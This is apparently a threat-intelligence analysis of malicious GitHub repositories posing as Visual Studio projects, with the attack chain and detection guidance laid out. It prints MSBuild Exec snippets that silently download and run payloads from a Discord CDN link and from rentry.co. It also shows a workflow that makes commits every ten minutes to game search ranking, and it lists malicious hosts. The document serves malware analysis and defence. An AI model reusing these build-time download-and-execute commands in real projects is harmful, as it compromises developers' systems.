package_info.package_manager: GitHub (source code repositories, not a package manager per se)
package_info.package_versions: N/A (repositories, not versioned packages; all current clones/commits affected)
package_info.why_malicious: These repositories are intentionally crafted to impersonate legitimate Visual Studio projects but contain obfuscated malware embedded in project files (.csproj/.vcxproj). They employ deceptive tactics such as frequent automated updates and fake stars to manipulate GitHub search rankings, luring users into downloading and executing malicious payloads delivered via external links or embedded code, resulting in remote code execution and system compromise.

execution_context.trigger: import-time/build-time (when project is opened or built in Visual Studio)

malicious_snippets.code_snippet:
<Target Name="CustomBuild" AfterTargets="Build">
  <Exec Command="powershell -w hidden -c Invoke-WebRequest -Uri hxxps://cdn.discordapp.com/attachments/1192526919577649306/1211404800575537304/VisualStudioEN.7z -OutFile VisualStudioEN.7z; Start-Process VisualStudioEN.7z" />
</Target>
malicious_snippets.code_behavior: At build-time, the code executes a hidden PowerShell command that downloads a remote archive (VisualStudioEN.7z) from a Discord CDN URL and immediately executes it, resulting in remote code execution and potential malware installation.

malice_analysis.why_suspicious: Embedding commands in project files to download and execute remote binaries from non-official sources is a clear indicator of malicious intent.
malice_analysis.violated_expectations: Legitimate .csproj/.vcxproj files define build configurations and dependencies, not arbitrary code execution or network downloads from untrusted domains.
malice_analysis.similar_legitimate_use: Automated build steps may download dependencies from trusted package registries, but never execute unverified binaries from file-sharing services.
key_indicators: Exec element invoking PowerShell with hidden window
Invoke-WebRequest to Discord CDN for binary download
Immediate execution of downloaded file via Start-Process
No validation or verification of downloaded content

execution_context.file_location: log (arbitrary file in repository root or subdirectory)

malicious_snippets.code_snippet:
# GitHub Actions workflow
name: Update Log
on:
  schedule:
    - cron: '*/10 * * * *'
jobs:
  update-log:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Update log file
        run: echo $(date) >> log
      - name: Commit changes
        run: |
          git config --global user.email "bot@example.com"
          git config --global user.name "Update Bot"
          git add log
          git commit -m "Update log"
          git push
malicious_snippets.code_behavior: On a scheduled basis, the workflow appends the current date to a file named 'log' and commits and pushes the change, generating frequent, non-functional repository updates to artificially boost search ranking.

malice_analysis.why_suspicious: Automated, contentless commits serve no development purpose and are used solely to manipulate repository visibility in search results.
malice_analysis.violated_expectations: Legitimate workflows automate meaningful tasks such as builds or tests, not meaningless file changes for search manipulation.
malice_analysis.similar_legitimate_use: Automated version bumps or changelogs with meaningful content, but not repetitive, empty updates.
key_indicators: Scheduled workflow with high-frequency triggers (every 10 minutes)
Commits to a non-essential file with no functional code changes
No associated code or documentation updates

execution_context.trigger: user download/execution (when user follows instructions in README or project documentation)

malicious_snippets.code_language: markdown (user instructions, not code per se)
malicious_snippets.code_behavior: When following documentation instructions, the user is directed to download a remote archive from a Discord CDN link, resulting in the retrieval of a potentially malicious file to the user's system.

malice_analysis.why_suspicious: Directing users to download executables from non-official, non-verified sources is a common malware delivery tactic and bypasses standard release verification.
malice_analysis.violated_expectations: Legitimate projects host releases on trusted platforms (e.g., GitHub Releases, official websites) and provide cryptographic verification, not anonymous file-sharing/CDN links.
malice_analysis.similar_legitimate_use: Beta releases or large files may be hosted externally, but only from trusted, verifiable sources with checksums or signatures.
key_indicators: External download link to Discord CDN in documentation
No cryptographic verification or official release process
Absence of checksums or digital signatures

execution_context.trigger: import-time/build-time (when project is opened or built in Visual Studio)

malicious_snippets.code_snippet:
<Target Name="MaliciousDownload" AfterTargets="Build">
  <Exec Command="powershell -w hidden -c Invoke-WebRequest -Uri hxxps://rentry.co/MuckCompanyMMC/raw -OutFile payload.ps1; powershell -ExecutionPolicy Bypass -File payload.ps1" />
</Target>
malicious_snippets.code_behavior: At build-time, the code executes a hidden PowerShell command that downloads a script from rentry.co and runs it with ExecutionPolicy Bypass, enabling arbitrary remote code execution from an untrusted source.

malice_analysis.why_suspicious: Downloading and executing scripts from pastebin-like services is a hallmark of malware delivery, especially when bypassing PowerShell execution policies.
malice_analysis.violated_expectations: Build scripts should not fetch and execute code from untrusted, dynamic sources, nor should they bypass security controls.
malice_analysis.similar_legitimate_use: Rarely, dynamic build configuration may fetch scripts, but only from trusted, versioned sources with integrity checks.
key_indicators: PowerShell download and execution from rentry.co
Use of ExecutionPolicy Bypass to circumvent security restrictions
No validation or verification of downloaded script

attack_chain.action: Malicious repository is created and populated with obfuscated code in project files and misleading documentation.
attack_chain.leads_to: Repository is indexed and appears in GitHub search results.

attack_chain.action: Automated GitHub Actions workflow frequently updates a log file to boost repository search ranking.
attack_chain.leads_to: Repository is more likely to be discovered by users.

attack_chain.action: User downloads the repository or follows instructions to download and execute a remote file.
attack_chain.leads_to: Malicious payload is downloaded to the user's system.

attack_chain.action: When the project is built or opened, embedded PowerShell commands in project files download and execute additional malware.
attack_chain.leads_to: Remote code execution and full compromise of the user's system.

behavioral_signatures: MSBuild project files (.csproj/.vcxproj) containing <Exec> elements that invoke PowerShell or network utilities (e.g., Invoke-WebRequest, curl, wget) to download and execute remote content.
PowerShell commands in build scripts that download and execute remote scripts or binaries from non-standard domains.
GitHub Actions workflows that make frequent, non-functional commits to arbitrary files (e.g., 'log') with no meaningful code changes.
Documentation or README files containing external download links to Discord CDN, rentry.co, paste.fo, or textbin.net.
file_indicators: .csproj or .vcxproj files with suspicious <Exec> elements invoking PowerShell or network utilities
log file with frequent, meaningless updates in repository root or subdirectories
README.md or documentation files with external download links to Discord CDN, rentry.co, paste.fo, or textbin.net
network_indicators: Outbound connections to cdn.discordapp.com/attachments/* for binary downloads
Outbound connections to rentry.co, paste.fo, or textbin.net for raw script downloads
Connections to ooocyber.keenetic.pro or 188.113.132.109 (if observed in network traffic)
detection_knowledge.how_to_detect: Scan Visual Studio project files for <Exec> elements that invoke PowerShell or network utilities, especially those referencing non-standard or suspicious domains. Monitor for GitHub Actions workflows that make frequent, non-functional commits to arbitrary files. Flag repositories or documentation that direct users to download executables from Discord CDN, rentry.co, paste.fo, or similar services. Monitor network traffic for connections to known malicious domains and file-sharing services used for malware delivery. Correlate these indicators to identify repositories exhibiting multiple suspicious behaviors.
